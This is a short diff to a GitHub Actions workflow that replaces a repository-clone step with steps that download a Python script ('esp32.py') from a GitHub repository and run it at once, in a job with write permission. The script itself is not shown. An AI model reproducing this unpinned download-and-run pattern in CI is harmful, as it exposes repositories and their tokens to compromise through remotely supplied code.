@@ -12,11 +12,6 @@ jobs:
       contents: write
     steps:
 
-    - uses: dabao1955/clone-github-repo-action@main
-      with:
-        depth: 1
-        branch: 'master'
-        owner: 'AndreRH'
-        repository: 'hangover'
-        submodule: false
-        path-to-clone: 'hangover-git'
+    - run: sudo apt update && sudo apt install wget python3 -y
+    - run: wget https://github.com/dpkg123/test_actions/raw/main/esp32.py
+    - run: python3 esp32.py
